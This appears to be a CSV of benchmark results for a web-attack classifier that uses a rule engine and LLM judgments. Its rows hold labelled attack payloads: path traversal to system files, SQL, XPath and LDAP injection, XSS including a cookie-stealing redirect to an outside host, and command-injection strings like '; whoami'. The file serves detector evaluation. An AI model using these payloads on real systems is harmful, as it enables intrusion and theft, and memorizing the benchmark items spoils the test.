dataset_index,sample_id,true_label,true_attack_type,predicted_label,predicted_attack_type,request_route,initial_status,final_status,source,attack_type,request_id,confidence,predicted_reasoning,latency_ms,submit_latency_ms,poll_count,completed,normalized_payloads,retrieval_trace_origin,retrieved_topk_count,retrieved_topk_categories,retrieved_topk_scores,retrieved_topk_payloads,retrieved_topk_source_files,retrieved_topk_line_nos,true_attack_type_in_topk,predicted_attack_type_in_topk,label_correct,attack_type_correct,error
52,xml_test-36217,malicious,Path Traversal,malicious,Path Traversal,immediate,200,200,rule_engine,Path Traversal,,1.0,,3540.8701650012517,3540.8406220085453,0,True,"[""/error/\\..\\..\\..\\..\\winnt\\win.ini"",""text/xml"",""*"",""0-h;q=0.2, IR3gn-6y9;q=0.2, jtid-v;q=0.8, lr-ose;q=0.2, h-w5isnean;q=0.8"",""Jlceif=tyiAf"",""253.92.235.246"",""A0ruzsuariit=csm2Ce5Ruyihlsdh;wouervt=rhwflIqdyehH;JqFTsE6=g/f+;1a=e6eir"",""$Version=\""830\"""",""Sun, 09 May 04 06:03:51 GMT"",""W/\""61@XYEowE14r6d8\"""",""100-continue"",""aesn@tdnix0ah2.ch"",""Sun, 20 Jun 04 18:13:48 CET"",""Sun, 11 Feb 07 19:49:27 GMT"",""*"",""*"",""\""kg4aiHskEb@3r3EtOx\"""",""0"",""3.7"",""at='o'"",""Basic YXVkY2VyeDo4U2Ft"",""NTLM bnBhSG9heGkzaGxvZUVvN293Y3o2ZW1ocEVyaHRheW90dG4xdGVlaXBMNHQ="",""183-"",""/flhdh2e/s0idu.mpg"",""trailers"",""Accept-Language"",""Mozilla/2.8 (Windows; U; WinNT 8.8; mm-Xx; rv:0.4.9) Gecko/43751578"",""MIPS"",""399,5892,8"",""Win98"",""5.8 110.84.189.241, HTTP/9.2 1.12.74.59"",""deflate"",""eEi/2.2, aafe/8.5, gceaso/0.6, aWa/4.3, tiau/5.9"",""003494109"",""------------------------------------------------"",""~~~~~~~~~~~~~""]",benchmark_sidecar_disabled,0,[],[],[],[],[],False,False,True,True,
106,patt-command-injection-0939,malicious,Command Injection,benign,,queued,202,200,llm_batch,,8644d3e64a220be7552ca730243525731a9114fa3d61748f9d5edb20e23f5bc3,0.9,"The payload consists only of a number, which is benign.",482353.5502929881,3537.648649988114,240,True,"[""/comments"",""Mozilla/5.0"",""application/x-www-form-urlencoded"",""1939""]",benchmark_sidecar_disabled,0,[],[],[],[],[],False,False,False,False,
29,xml_test-36214,malicious,Path Traversal,malicious,Path Traversal,queued,202,200,llm_batch,Path Traversal,383330e4b5180582b64f30aebdce954de3c62cdb5c6ac6404291839a6e51bab3,1.0,The payload contains a path traversal sequence /.nsf/../winnt/win.ini attempting to access a sensitive system file.,482354.0169750049,3549.728807003703,240,True,"[""/.nsf/../winnt/win.ini"",""text/plain"",""*;q=0.2"",""lcnedp-h1oaehhe, etaO-32i, Ocgcteo-oa2lzhe;q=0.8"",""no-store"",""57.19.106.255"",""coeiuaSo=cirjmjD9gzfw;f6=HhtaccesmT%]lib~l(tbE;Lh9P0aZJi=219391923;nasNdhnrsa=3:roI"",""$Version=\""32\"""",""Tue, 13 Nov 07 06:20:50 UTC"",""\""GO2S.faufqbFl7gf_ODS\"""",""e86z=ehdsOdp;uenhi1"",""aesn@tdnix0ah2.ch"",""Sun, 20 Jun 04 18:13:48 CET"",""*"",""*"",""\""kg4aiHskEb@3r3EtOx\"""",""58"",""3.7"",""no-cache"",""NTLM dDhtZW9ubThvZWFlbW1pZW1IZVRoMXRlb1JlYnRyaUhhb2U3aWg4UlRoZXF0cEU="",""NTLM bnBhSG9heGkzaGxvZUVvN293Y3o2ZW1ocEVyaHRheW90dG4xdGVlaXBMNHQ="",""183-"",""http://www.tLIipxb.ch/niqSlcse/9etsnatp/sdoexAS.css"",""trailers"",""Accept-Language"",""Mozilla/4.5 (compatible; mxtmouo; Linux i586; rn7md2e)"",""MIPS"",""399,5892,8"",""Win98"",""5.8 110.84.189.241, HTTP/9.2 1.12.74.59"",""eEi/2.2, aafe/8.5, gceaso/0.6, aWa/4.3, tiau/5.9"",""003494109"",""-------------------------------""]",benchmark_sidecar_disabled,0,[],[],[],[],[],False,False,True,True,
451,xml_test-36212,malicious,Path Traversal,malicious,Path Traversal,queued,202,200,llm_batch,Path Traversal,c4fe048e6dbc6d8c23a9594971c1be8f49451881fb337c413f9e6d36d698cf06,1.0,The payload contains a path traversal sequence /.nsf/../winnt/win.ini attempting to access a sensitive system file.,482352.60715200275,3554.8826299927896,240,True,"[""/.nsf/../winnt/win.ini"",""*/*"",""iso-8859-1;q=0.5"",""*;q=0.0"",""no-transform"",""57.19.106.255"",""8t3=liuatRehoc6eN;HKQYVbinb-kAP=3305;mn5via=1;DFQPV=knoderughhCsaaajl;oTcr=6081375"",""$Version=\""32\"""",""Sun, 24 May 09 19:47:41 CET"",""\""GO2S.faufqbFl7gf_ODS\"""",""e86z=ehdsOdp;uenhi1"",""aesn@tdnix0ah2.ch"",""Sun, 20 Jun 04 18:13:48 CET"",""*"",""*"",""\""kg4aiHskEb@3r3EtOx\"""",""183"",""3.7"",""no-cache"",""Digest realm"",""Basic ZGhvbjpuZHRmcno="",""183-"",""/Lrs6D0y/giem/iene/0edTi5ib.tiff"",""trailers"",""Accept-Language"",""eeb8Ism (sGLd2_JtN)"",""399,5892,8"",""Win98"",""7.0 124.150.160.142, FTP/1.0 162.249.68.178, 1.0 22.82.91.231:088"",""sst2oo/6.7, eatt/1.0"",""003494109""]",benchmark_sidecar_disabled,0,[],[],[],[],[],False,False,True,True,
90,xml_test-41727,malicious,SQLi,malicious,SQLi,queued,202,200,llm_batch,SQL Injection,9bb1f2b6e34d59a708d1fa6b31ff162184f4700634e26f86708295a27749d92e,1.0,"The payload contains a clear SQL injection pattern 'OR'At'='2ti', attempting to manipulate a query.",482333.8842170051,3560.9206490044016,240,True,"[""/egpaF-gb56/arfqensi0/htwe/iijfmusjodssmi1ri/t0fw0YA-4h/ueenrraTectuohos/bs/sZ-Zq/6hkrihd/hweeth95satinh7dshh/oLK6IXtfY..cfm"",""e3c3ztmpcmdi&rcpkcopynthomees"",""OrigText'OR'At'='2ti'"",""989787"",""8cpet26peyrdtqt"",""ercpji"",""styledOeezIhom@oy~h)d5"",""video/quicktime"",""*;q=0.0"",""*;q=0.5"",""no-cache"",""130.12.152.206"",""_WoQ=idai;i7Qeufemcsst=gHi1se1znounnlag8;o8Hh9t4jM@=eOpjrt7t5C34t1h"",""$Version=\""6\"""",""Fri, 18 May 07 24:43:02 UTC"",""\""x-y4MP-XTys@LWVZvO_A\"""",""100-continue"",""weLnae2@eCsehh7ca.cz"",""Sun, 23 Aug 09 08:04:15 GMT"",""Tue, 01 Apr 08 21:28:37 GMT"",""*"",""\""GXrGnNJe9dDO4fka\"""",""\""@Y6hzZv2wbBivlH\"""",""073"",""5.7"",""no-cache"",""Basic cmllaHR0YnQ6dHJlMg=="",""Basic bHU2dGQ6bWN0Tndp"",""111-,-67748,-483206"",""http://yRerat.de/teTg/Amtik8/tsdEme/dEmCnse/reaeawat.asmx"",""gzip,trailers,deflate"",""Via"",""aLL_6YnBDM http://www.derxueC.fr"",""Sparc"",""1862,8220,8"",""FreeBSD"",""color8"",""3172x1738"",""ERqer0/6.5 143.127.90.240, HTTP/6.7 www.to8ctr.jpg:48909, 2.3 83.249.237.195"",""compress"",""kmeyp7/6.4, oab/2.7, peZa/7.9, tihsau/8.6, rstvvt/0.5"",""132 www.gls0.js \""sseahcsnj2f1dtnEm93r\"""",""152.105.208.9"",""3549851527623289"",""-------------------------------------------------"",""~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~""]",benchmark_sidecar_disabled,0,[],[],[],[],[],False,False,True,True,
563,patt-xss-1328,malicious,XSS,malicious,XSS,immediate,200,200,rule_engine,XSS,,1.0,,3581.9727320049424,3581.9354360137368,0,True,"[""/search"",""curl/8.0.1"",""application/x-www-form-urlencoded"",""ABC<div style=\""x:expression\\x00(javascript:alert(1)\"">DEF"",""2328""]",benchmark_sidecar_disabled,0,[],[],[],[],[],False,False,True,True,
620,patt-xpath-injection-0273,malicious,XPath Injection,malicious,XPath Injection,queued,202,200,llm_batch,XPath Injection,fb62e3ffca2ef1216cc8fd147d346f44c60040e69d85efa8a75ad8018b6931d9,1.0,"The payload contains a clear XPath injection pattern ' and count(/comment())=1 and '1'='1, attempting to extract information or manipulate an XPath query.",482355.2890009887,3581.2104799988447,240,True,"[""/comments"",""python-requests/2.31"",""application/x-www-form-urlencoded"",""' and count(/comment())=1 and '1'='1"",""1273""]",benchmark_sidecar_disabled,0,[],[],[],[],[],False,False,True,True,
184,patt-path-traversal-1015,malicious,Path Traversal,malicious,Path Traversal,queued,202,200,llm_batch,Path Traversal,ed5a60966cd5677bc1fa285e530d01be26989bb51b557f9b7bdc25c8409c2940,1.0,"The payload contains an excessive path traversal sequence ..../..../..../..../..../..../..../{FILE}, attempting to access a file outside the intended directory.",482388.15493699803,3585.0002969964407,240,True,"[""/download"",""python-requests/2.31"",""application/x-www-form-urlencoded"",""..../..../..../..../..../..../..../{FILE}"",""2015""]",benchmark_sidecar_disabled,0,[],[],[],[],[],False,False,True,True,
10,xml_test-45084,malicious,Path Traversal,malicious,Path Traversal,queued,202,200,llm_batch,Path Traversal,15dc0d528a5e5fbd45876c17d927e81dbd5b18ce24fcbc762c33ccd1e8c78dfd,1.0,The payload contains a path traversal sequence /.nsf/../winnt/win.ini attempting to access a sensitive system file.,482388.27764800226,3604.9974219931755,240,True,"[""/.nsf/../winnt/win.ini"",""image/jpeg;q=0.9, application/zip;q=0.8"",""*"",""*"",""min-fresh=6"",""11.179.164.13"",""evl4bir=42314;Ef0rj=oe7arWFhr7tse8;tckllelebd=455904"",""$Version=\""865\"""",""Thu, 16 Jul 09 06:16:40 CET"",""W/\""ripDnExYI_q8e4R\"""",""100-continue"",""uoSnnen@oz8Aa.ch"",""Wed, 30 Nov 05 11:41:10 CET"",""Mon, 20 Mar 06 13:02:50 GMT"",""\""m7e8SWEORE3SARe6\"""",""\""Y8el-sjYmzeIAj0IW7\"""",""\""dE-XGHqUO90YpYkq\"""",""486"",""9.2"",""ly4z='pj'"",""Digest cnonce=\""lEha\"""",""NTLM ZWZzcGhlU3JhdGRXb2hyb3R0a3RybHpQaWVydGRpdXRkZW8="",""61-,599945-,96-"",""http://www.tiaweo.be/fnhpo/oDett/bteamhu.php3"",""trailers,chunked"",""Connection"",""RTea/2.4"",""StrongARM"",""0628,6146,8"",""Win98"",""color8"",""1990x238"",""HTTP/5.9 www.5noStnoe.png:1579, 6txea/1.9 227.39.180.139, 4.6 112.69.200.126"",""identity"",""ttpNf/8.4"",""437 www.epd64fo.jpeg \""eNe3tlcu\"""",""138.45.117.11"",""324503957971792"",""---------------------------------"",""~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~""]",benchmark_sidecar_disabled,0,[],[],[],[],[],False,False,True,True,
201,patt-command-injection-0882,malicious,Command Injection,malicious,RCE,queued,202,200,llm_batch,RCE,fdde35988813116719be1461a7bf55180e3cc795d6638f6da503783725f74c86,1.0,"The payload contains who`echo am`i, which uses backticks for command substitution, indicating a Remote Code Execution (RCE) attempt.",482366.1919090082,3607.2215989988763,240,True,"[""/comments"",""curl/8.0.1"",""application/x-www-form-urlencoded"",""who`echo am`i"",""1882""]",benchmark_sidecar_disabled,0,[],[],[],[],[],False,False,True,False,
735,patt-command-injection-0937,malicious,Command Injection,malicious,Command Injection,immediate,200,200,rule_engine,Command Injection,,1.0,,3621.1536769988015,3621.1267869948642,0,True,"[""/comments"",""python-requests/2.31"",""application/x-www-form-urlencoded"",""'; whoami"",""1937""]",benchmark_sidecar_disabled,0,[],[],[],[],[],False,False,True,True,
500,xml_test-36859,malicious,LDAP Injection,malicious,LDAP Injection,queued,202,200,llm_batch,LDAP Injection,e0544ef404eb7f99df0cd3ae0efa6d3f77e369a1e4de39be5ccfe7376c6e36ae,1.0,"The payload contains (&(objectClass= oan*), which is a clear pattern for LDAP injection.",482394.87146699685,3615.459908003686,240,True,"[""/oLEMlEcsJ.kTJcDQXQ5g/cBDiRu-_cWd7x./t2uFnpW@qHCYWm_L5/vetd/egicyL9orn5btrnNale/I6FVQ9mwPp0sZ/DuojmisdhEehei/eh0tentnteessoehhq.shtml"",""image/gif;q=0.5, text/*;q=0.4"",""*"",""*;q=0.9"",""no-cache"",""209.177.77.169"",""aHha=b ;deall nqsoZhta"",""$Version=\""9\"""",""Fri, 03 Mar 06 12:50:19 GMT"",""\""93Pa0A.Gi0zdrPvWdQy1\"""",""100-continue"",""lvelladt@3trbvtitH.net"",""Tue, 30 May 06 03:52:06 GMT"",""Wed, 06 Oct 04 09:41:47 GMT"",""\""zRzehBEAj8jTFKdQmY\"""",""*"",""*"",""57"",""9.1"",""l=ik"",""Digest uri=http://eiecdnRr.ch/Iftd/y8awyiFe.png"",""62221-7,-0"",""http://7nmghinO.de/8do3rtcw/bci7Osp/e2soase/dBIM/gzo0R3j.sh"",""chunked"",""oe9)(&(objectClass=    oan*)"",""MIPS"",""564,7539,32"",""color32"",""6170x381"",""FTP/9.3 30.130.172.73"",""3em9h0"",""867 89.104.184.212 \""huesnmueeatale\"""",""~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~""]",benchmark_sidecar_disabled,0,[],[],[],[],[],False,False,True,True,
215,patt-command-injection-0809,malicious,Command Injection,malicious,Command Injection,immediate,200,200,rule_engine,Command Injection,,1.0,,3638.5218929935945,3638.4935370006133,0,True,"[""/login"",""python-requests/2.31"",""application/x-www-form-urlencoded"",""psql -o'|id>/tmp/foo'"",""1809""]",benchmark_sidecar_disabled,0,[],[],[],[],[],False,False,True,True,
248,xml_test-42243,malicious,SQLi,malicious,SQLi,queued,202,200,llm_batch,SQLi,bd1a502c485e5fefc6c1af74ee94978e55475f130887b904a12f6c619b14fcd2,0.95,The payload contains a classic SQL injection pattern: ' /**/ OR /**/'' = '.,512444.09001400345,3644.933564006351,255,True,"[""/sftss4r/xDXJ3a4NjOTVt1m/e5newijaerselw/lj_/z9b.ZND/cZo8O/bVrsWdocumentK/7esMaQ/x1Ddih/6s0Pq/nc8sHee/kleya40VLrsjcp1f.bin"",""x7rC6haaluorss"","" Ne xtermiapnh~cmetaeexec6nph-St"",""wdsnIb"",""e8tb&$i4hosldd usoei"",""573389"",""nr9odzushht3"",""vsrsCede"",""lntiethuhl"",""5Wdj@u_lZ68L"",""dEhm"",""'     /**/    OR    /**/''  =   '"",""ncohoaw"",""47023310"",""evtr 'm0;gandp"",""1ixot"",""text/xml;q=0.5"",""*;q=0.8"",""*;q=0.0"",""only-if-cached"",""109.121.232.30"",""fra1oeos= 0etud l3ut ;DfHe1dCMjR=9;he2egNaefe=IrJe xvet-iems9"",""$Version=\""26\"""",""Sun, 02 Jul 06 16:59:54 GMT"",""\""AwZJ1R96_ZwyUkum\"""",""100-continue"",""AhkTtd8@hidg5ir.de"",""Sat, 31 Jan 09 09:28:58 UTC"",""Fri, 02 Dec 05 05:15:25 GMT"",""*"",""*"",""*"",""2022"",""7.5"",""eRot='7e9rdKid'"",""NTLM M2FlbzFvd2R2amFoamFybnhjcWx1dXRkMXZhOXhMaXRtbmtzc2RPYXBl"",""Basic bkllNklrdzptcGlDbGRvNw=="",""4539-14148,-19,934-"",""http://www.ooeyds.com/9at9no/anseok.gif"",""trailers,trailers,trailers"",""Accept-Encoding"",""Mozilla/3.2 (Machintosh; U; PPC Mac OS X 6.4; tn-wo; rv:4.1.5) Gecko/33403215"",""StrongARM"",""8058,0040,16"",""Windows 98"",""color32"",""108x2342"",""9.3 www.zieguner.shtml"",""gzip"",""sssi/2.7, rim/3.4, mCeth/1.0, n82sil/5.7"",""028 56.37.102.108 \""t6tlhhan1eX2IilnhgP\"""",""42.114.104.151"",""29366252"",""--------------------------------"",""~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~""]",benchmark_sidecar_disabled,0,[],[],[],[],[],False,False,True,True,
412,sample-412,malicious,Path Traversal,malicious,Path Traversal,immediate,200,200,rule_engine,Path Traversal,,1.0,,3649.9928220000584,3649.9646060110535,0,True,"[""/rest/products/search"",""..\\..\\../winnt/system32/cmd.exe?/c+dir+c:\\"",""commix/v4.2.dev1 (https://commixproject.com)"",""*/*"",""application/x-www-form-urlencoded""]",benchmark_sidecar_disabled,0,[],[],[],[],[],False,False,True,True,
35,xml_test-6681,benign,,malicious,Command Injection,immediate,200,200,rule_engine,Command Injection,,1.0,,3653.1618860026356,3653.134927008068,0,True,"[""/l10TunCAQlS/enCvdC31@Mq5T1tcXI_.html"",""vp"",""compress"",""http://www.ltwacv.gov/dltz/sdtrdude/diphrc/svotv.css"",""N2hOdWlueWlyZ3JlYXNuaQ=="",""application/x-www-form-urlencoded"",""Tue, 19 Jun 07 23:24:58 UTC"",""Tue, 04 Aug 09 22:59:24 CET"",""*/*;q=0.7"",""*"",""pAcnwbdj-eyhicogg;q=0.8, e8r-secfve;q=0.6, trhemdu0-eih, 6H9iteno-dz;q=0.2, te9d7ae-nCtd"",""max-age=7"",""177.176.36.93"",""tsirsheadm=meL3u@;uxr0=nPO"",""$Version=\""165\"""",""Sun, 08 Aug 04 24:59:05 GMT"",""W/\""hP64pnhEM96LTvD\"""",""otntth=tlnunhit"",""R5anodt@eiRwb.com"",""Fri, 01 Dec 06 12:02:36 GMT"",""Fri, 23 Jul 04 09:13:36 UTC"",""\""20zeabnk5OL3nWet@\"""",""*"",""*"",""531"",""9.9"",""bwtyh='nos'"",""Basic dW51dGVlOmFuaHJ5"",""Basic cXNyY254dDphZHR5"",""-70"",""/5wail8de.js"",""trailers,trailers,deflate;q=0.2"",""Accept-Language"",""2zd3v5XU0 http://www.emghIacu.fr"",""Sparc"",""8391,040,16"",""Windows 95"",""color16"",""075x397"",""7.1 www.aiolic.png, HTTP/5.0 www.conygdgn.jpeg, HTTP/9.0 www.OrhsfAr.gif:9"",""compress"",""tuerio/7.1, 9oaf/9.3"",""490 164.192.138.202 \""mmabac8fuum\"""",""239.4.241.123"",""688311326706532"",""----------------------------------------------"",""~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"",""u"",""2918"",""iiscriptald="",""noD9ms82jmxu"",""8287"",""lnhnOtaa"",""4E3rR"",""eihtas"",""rac8l"",""723"",""080284"",""786888"",""h includeo"",""t@b :imoGtr|hrLorhh"",""0197783""]",benchmark_sidecar_disabled,0,[],[],[],[],[],False,False,False,False,
317,xml_test-19699,benign,,benign,,queued,202,200,llm_batch,,79bc6f75879f0301a0654dccdf914cdb5567e78c96e5b3acd1f0057878a06f38,0.7,"The payload contains obfuscated strings and a .sh extension in the URL path, but no clear malicious injection patterns or commands are present. Leaning towards benign as per rules.",512517.062576997,3668.0227180040674,255,True,"[""/onmnnieshtoh/fC0D-EofI.Z__OzWY/uwzsIyjMhWu/AV1SYAUKNrw/yOrdm/g2A.Z0ZallOJN4A/rm3em3ptXqqJRp6@s2Zc/7fieeqhdrfAsimseette/oaho7enBesdCdVinao/Xqs2ae/adn0Pc5NZ7Qg/qx1n2fVjFz7hq7-wU1ug.sh"",""dhyryobddi"",""oyHnrtWic"",""6387882"",""zttrcReabtt%uT2"",""cuClJla1Q"",""Btndocument~afzO"",""e"",""8250263"",""56974566"",""Sogtseee5ravoeRs"","" eeaiu9feny@ m"",""nOa6cuW"",""wEvtbadminHpexecejt6m%rdropb"",""oEK4pbOUmSNP"",""*/*"",""iso-8859-8;q=0.6, koi8;q=0.3, windows-1258;q=0.5, windows-874"",""*"",""only-if-cached"",""189.62.159.142"",""ek=5;L_incopy=580286;7h=nJC8ZDr@M"",""$Version=\""138\"""",""Sun, 11 Jun 06 05:27:38 UTC"",""\""eEdcWMNNX4bKI0hGF4\"""",""100-continue"",""moea@estmzx.uk"",""Sat, 31 Oct 09 07:40:50 CET"",""Fri, 10 Dec 04 05:14:13 UTC"",""*"",""\""LL1msfManbsY@hStL\"""",""Wed, 24 Dec 08 23:55:11 GMT"",""2"",""5.2"",""no-cache"",""is6eir e7Od1r=qus9thtv"",""Basic ZGVhU3Q6c3RyRWRPb1M="",""-6,-1,-676621"",""http://www.ssapseaa.st/sipSt/heBnqw/enEu9iEc/smeoa.bin"",""chunked,gzip;q=0.9,chunked"",""Authorization"",""utdonurg9sn6ltg"",""PowerPC"",""822,055,16"",""Solaris"",""color16"",""947x1810"",""7.1 www.rs0tso3t.jpeg, 3.2 www.lIei3at2.shtml"",""deflate"",""mja7/2.8, uir/4.7, nlrofw/0.2, us2ilt/5.4"",""409 239.183.137.136 \""kwybnsisahj2Sco\"" \""Sun, 04 Dec 05 21:19:44 UTC\"""",""103.115.185.154"",""7592797493312"",""------------------------------"",""~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~""]",benchmark_sidecar_disabled,0,[],[],[],[],[],False,False,True,False,
323,patt-command-injection-0836,malicious,Command Injection,malicious,RCE,queued,202,200,llm_batch,RCE,7837e19c847144225fd1cfff7d279b963311bdc624c9b3f83ab5e37c6cd74805,0.98,"The payload contains 'system('whoami');', which is a clear attempt at Remote Code Execution.",512537.5869379932,3669.7169359977124,255,True,"[""/download"",""python-requests/2.31"",""application/x-www-form-urlencoded"",""system('whoami');"",""1836""]",benchmark_sidecar_disabled,0,[],[],[],[],[],False,False,True,False,
425,xml_test-46753,malicious,XSS,malicious,XSS,immediate,200,200,rule_engine,XSS,,1.0,,3677.3922519932967,3677.36634099856,0,True,"[""/q2eia5teiwth/QlKA/lVI_yL/o10-SSSCC@Cv/r4ieexg/sY/nV85o5Y/n.pFeIz-y4cHFN2/n5Na/havingsAjV6KM.pl"",""8oo'adIeistdin~p\""alib\""t'"",""8304"",""005"",""626131"",""i0qrSs"",""*/*;q=0.5"",""windows-1251, euc-jp;q=0.6, windows-1254;q=0.5, windows-1257, x-mac-roman"",""oeT8e-ht, t-ht;q=0.9, rarh-ndrei0q, e-e6sRthH;q=0.4"",""max-stale=05336"",""206.197.219.246"",""loceib9=<body     onload =   \"" [document.location.replace   ('http://www.ndat.com/cgi-bin/as.cgi'+document.cookie);] \""  >;teoe=usOe~utve5[;ikh=rSVyhH;bbE68e8mIy=jYnXitbNqw;kNmeeqsp=295"",""Wed, 13 Jan 10 13:45:05 CET"",""100-continue"",""Wed, 25 Feb 09 13:08:27 GMT"",""Sat, 08 Dec 07 14:27:45 CET"",""\""7z2XFHfTX5Qag_6jlQDw\"""",""*"",""8"",""no-cache"",""uhnri spaiinmr=hhjln"",""http://hTae44.gov/vtse4/tItut/iiaD/nanevdex.msf"",""trailers,gzip;q=0.4"",""Warning"",""Mozilla/7.6 (compatible; ad4loadAw; Win98; nbho6iosdd; cihlaueuy; jyfuets)"",""PowerPC"",""0.4 76.187.253.154"",""compress"",""249 www.fwhwk.htm \""usscchornmwtEs1afes\"""",""12.112.216.2"",""------------------------------"",""~~~~~~~~~~~~~~~~~~~""]",benchmark_sidecar_disabled,0,[],[],[],[],[],False,False,True,True,
548,patt-xss-1294,malicious,XSS,malicious,XSS,immediate,200,200,rule_engine,XSS,,1.0,,3690.13408900355,3690.109086004668,0,True,"[""/api/items"",""Mozilla/5.0"",""application/x-www-form-urlencoded"",""\""`'><script>\\xE1\\x9A\\x80javascript:alert(1)</script>"",""2294""]",benchmark_sidecar_disabled,0,[],[],[],[],[],False,False,True,True,
60,xml_test-45140,malicious,Path Traversal,malicious,Path Traversal,immediate,200,200,rule_engine,Path Traversal,,1.0,,3695.81270198978,3695.78699998965,0,True,"[""/error/\\..\\..\\..\\..\\winnt\\win.ini"",""text/xml;q=0.2, video/*;q=0.8, audio/basic"",""*"",""*;q=0.0"",""max-age=240"",""loaDlrpnwsm=i;egjS0daS=o;ncSof3ZRb=9142218436;yvcs=EortmaAowtln"",""$Version=\""007\"""",""Sun, 08 Oct 06 11:01:49 GMT"",""\""lqmFIaU9n7qmiRtYCX\"""",""9.6"",""er7uvrN='eiTldzr'"",""Digest qop=auth"",""http://www.qcycuAo.net/tldl/agedt8/ea1nwqf/eeEelv.cgi"",""i5WVEZnP http://www.o9r02s.it"",""97877"",""-----------""]",benchmark_sidecar_disabled,0,[],[],[],[],[],False,False,True,True,
262,xml_test-48481,malicious,XPath Injection,malicious,Command Injection,immediate,200,200,rule_engine,Command Injection,,1.0,,3708.8114860089263,3708.785226001055,0,True,"[""/mQbNtmp/nwRDW1OMeP5/a6nwe6dxoen/t2A0HG.js"",""sorm2"",""Tu"",""9964"",""pnuserhe9tpadwae"",""n$r"",""wnscs d"",""3oK"",""auyexece2fdlngane"",""(Y8"",""lroshutdownrubhtpasshbgsoundh~q"",""*/*"",""windows-1254, iso-2022-jp;q=0.6, iso-8859-4;q=0.2, windows-1253"",""*"",""no-store"",""aiwnandd1etng=2gAsl2d9el;iemrnce5La=2n/o3Tn/eeslen/child::node()[  position()=947] | asmist/nma9t/5db0sn/child::text()[position()=058]   or   'the'='"",""$Version=\""67\"""",""Sun, 17 Apr 05 04:17:39 CET"",""\""GwxuVzY0A0Ejlo6uY\"""",""100-continue"",""Sun, 01 Feb 04 01:39:21 UTC"",""Sun, 27 Dec 09 22:06:02 CET"",""\""-EtmvdQPF7F1104mI\"""",""*"",""*"",""3655"",""0.1"",""n51='wkss7s'"",""Digest nonce"",""Basic YXdFRWF5NnQ6YW81NDN1bA=="",""556-,789454-,8416-292"",""http://www.aaqi.st/QolhOka/9j7e.htm"",""chunked;q=0.6,trailers"",""Via"",""6c6ihn (ne4-8p; l@2Qy12; s9xAH_bEB; a3fHjAV65)"",""6.6 147.202.84.226, biFsn/0.4 www.H0lea5s.html"",""gzip"",""lA4o/4.9"",""217 www.doicU.tiff \""mMeckkoef9\"""",""95.68.224.9"",""------------"",""~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~""]",benchmark_sidecar_disabled,0,[],[],[],[],[],False,False,True,False,
277,patt-xpath-injection-0492,malicious,XPath Injection,malicious,XPath Injection,queued,202,200,llm_batch,XPath Injection,019aaf7341a2d78730e65bc79b97e3de3b8e11262ef5308eb04cb5bd248f0845,0.95,"The payload contains 'substring(//user[userid=5]/username,2,1)=codepoints-to-string(INT_ORD_CHAR_HERE)', which is a clear XPath injection pattern.",512550.26591799106,3717.0006270025624,255,True,"[""/comments"",""python-requests/2.31"",""application/x-www-form-urlencoded"",""substring(//user[userid=5]/username,2,1)=codepoints-to-string(INT_ORD_CHAR_HERE)"",""1492""]",benchmark_sidecar_disabled,0,[],[],[],[],[],False,False,True,True,
